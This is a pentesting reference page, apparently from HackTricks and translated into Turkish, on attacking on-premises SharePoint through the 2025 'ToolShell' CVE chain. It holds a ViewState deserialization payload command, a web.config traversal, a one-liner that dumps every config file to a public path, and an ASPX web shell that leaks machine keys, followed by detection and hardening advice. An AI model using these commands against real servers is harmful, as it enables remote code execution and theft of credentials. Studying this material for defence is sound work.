# Microsoft SharePoint – Pentesting & Exploitation

{{#include ../../banners/hacktricks-training.md}}

> Microsoft SharePoint (yerinde) ASP.NET/IIS üzerine inşa edilmiştir. Bu nedenle, klasik web saldırı yüzeyinin çoğu (ViewState, Web.Config, web shell'ler vb.) mevcuttur, ancak SharePoint ayrıca maruz kalan saldırı yüzeyini önemli ölçüde genişleten yüzlerce özel ASPX sayfası ve web hizmeti ile birlikte gelir. Bu sayfa, Unit42 tarafından açıklanan 2025 exploit zincirine (CVE-2025-49704/49706/53770/53771) vurgu yaparak, SharePoint ortamlarında sayım, istismar ve kalıcılık sağlamak için pratik ipuçlarını toplar.

## 1. Quick enumeration
```
# favicon hash and keywords
curl -s https://<host>/_layouts/15/images/SharePointHome.png
curl -s https://<host>/_vti_bin/client.svc | file -  # returns WCF/XSI

# version leakage (often in JS)
curl -s https://<host>/_layouts/15/init.js | grep -i "spPageContextInfo"

# interesting standard paths
/_layouts/15/ToolPane.aspx               # vulnerable page used in 2025 exploit chain
/_vti_bin/Lists.asmx                     # legacy SOAP service
/_catalogs/masterpage/Forms/AllItems.aspx

# enumerate sites & site-collections (requires at least Anonymous)
python3 Office365-ADFSBrute/SharePointURLBrute.py -u https://<host>
```
## 2. 2025 exploit zinciri (diğer adıyla “ToolShell”)

### 2.1 CVE-2025-49704 – ToolPane.aspx'da Kod Enjeksiyonu

`/_layouts/15/ToolPane.aspx?PageView=…&DefaultWebPartId=<payload>` sayfaya rastgele *Server-Side Include* kodunun enjekte edilmesine izin verir ve bu kod daha sonra ASP.NET tarafından derlenir. Bir saldırgan, `Process.Start()`'ı çalıştıran C# kodunu gömebilir ve kötü niyetli bir ViewState bırakabilir.

### 2.2 CVE-2025-49706 – Yanlış Kimlik Doğrulama Atlatma

Aynı sayfa, site bağlamını belirlemek için **X-Forms_BaseUrl** başlığına güvenmektedir. Bunu `/_layouts/15/`'e yönlendirerek, kök sitede uygulanan MFA/SSO **kimlik doğrulaması olmadan** atlatılabilir.

### 2.3 CVE-2025-53770 – Kimlik Doğrulaması Olmayan ViewState Deserialization → RCE

Saldırgan `ToolPane.aspx`'da bir gadget'ı kontrol ettiğinde, .NET deserialization'ı tetikleyen **imzasız** (veya yalnızca MAC) `__VIEWSTATE` değerini gönderebilir ve bu da kod yürütmeye yol açar.

Eğer imzalama etkinse, herhangi bir `web.config`'ten **ValidationKey/DecryptionKey**'i çalın (bkz. 2.4) ve yükü *ysoserial.net* veya *ysodom* ile sahteleyin:
```
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -o raw -c "cmd /c whoami" |
ViewStateGenerator.exe --validation-key <hex> --decryption-key <hex> -o payload.txt
```
ASP.NET ViewState'i kötüye kullanma hakkında derinlemesine bir açıklama için okuyun:
{{#ref}}
../../pentesting-web/deserialization/exploiting-__viewstate-parameter.md
{{#endref}}

### 2.4 CVE-2025-53771 – Yol Traversali / web.config Açığa Çıkarma

`ToolPane.aspx`'ye hazırlanmış bir `Source` parametresi göndermek (örneğin `../../../../web.config`), hedef dosyayı döndürerek aşağıdakilerin açığa çıkmasına izin verir:

* `<machineKey validationKey="…" decryptionKey="…">`  ➜ ViewState / ASPXAUTH çerezlerini sahte oluşturma
* bağlantı dizeleri ve gizli anahtarlar.

## 3. Gerçek hayatta gözlemlenen sonrası istismar tarifleri

### 3.1 Her *.config* dosyasını dışarı aktar (varyasyon-1)
```
cmd.exe /c for /R C:\inetpub\wwwroot %i in (*.config) do @type "%i" >> "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\debug_dev.js"
```
Sonuç olarak elde edilen `debug_dev.js` anonim olarak indirilebilir ve **tüm** hassas yapılandırmaları içerir.

### 3.2 Base64 kodlu ASPX web shell'i dağıtın (varyasyon-2)
```
powershell.exe -EncodedCommand <base64>
```
Kodlanmış yük örneği (kısaltılmış):
```csharp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
Response.Write(MachineKey.ValidationKey);
// echo secrets or invoke cmd
}
</script>
```
Yazıldığı yer:
```
C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx
```
Shell, çiftlik genelinde ViewState ve ASPXAUTH çerezlerini sahte olarak oluşturmayı sağlayan **makine anahtarlarını okuma / döndürme** uç noktalarını açığa çıkarır.

### 3.3 Obfuscate edilmiş varyant (varyasyon-3)

Aynı shell ama:
* `...\15\TEMPLATE\LAYOUTS\` altına bırakıldı
* değişken adları tek harfe indirildi
* sandbox kaçışı ve zaman tabanlı AV atlatma için `Thread.Sleep(<ms>)` eklendi.

## 4. Tespit fikirleri

| Telemetri | Neden şüpheli |
|-----------|----------------|
| `w3wp.exe → cmd.exe`             | İşçi süreci nadiren shell açmalıdır  |
| `cmd.exe → powershell.exe -EncodedCommand` | Klasik lolbin deseni           |
| `debug_dev.js` veya `spinstall0.aspx` oluşturan dosya olayları | ToolShell'den doğrudan IOC'ler |
| `ProcessCmdLine CONTAINS ToolPane.aspx` (ETW/Modül günlükleri) | Kamuya açık PoC'ler bu sayfayı çağırır |

Örnek XDR / Sysmon kuralı (pseudo-XQL):
```
proc where parent_process_name="w3wp.exe" and process_name in ("cmd.exe","powershell.exe")
```
## 5. Güçlendirme & Azaltma

1. **Yamanla** – Temmuz 2025 güvenlik güncellemeleri *tüm* dört CVE'yi düzeltir.
2. Kompromize sonrası her `<machineKey>` ve `ViewState` gizli anahtarını **değiştirin**.
3. `WSS_WPG` & `WSS_ADMIN_WPG` gruplarından *LAYOUTS* yazma iznini kaldırın.
4. Proxy/WAF seviyesinde `/_layouts/15/ToolPane.aspx` dış erişimini engelleyin.
5. **ViewStateUserKey**, **MAC etkin**, ve özel *EventValidation*'ı etkinleştirin.

## İlgili hileler

* IIS sonrası istismar & web.config kötüye kullanımı:
{{#ref}}
../../network-services-pentesting/pentesting-web/iis-internet-information-services.md
{{#endref}}

## Referanslar

- [Unit42 – Microsoft SharePoint Açıklarının Aktif İstismarı](https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/)
- [GitHub PoC – ToolShell istismar zinciri](https://github.com/real-or-not/ToolShell)
- [Microsoft Güvenlik Danışmanlığı – CVE-2025-49704 / 49706](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-49704)
- [Microsoft Güvenlik Danışmanlığı – CVE-2025-53770 / 53771](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-53770)

{{#include ../../banners/hacktricks-training.md}}
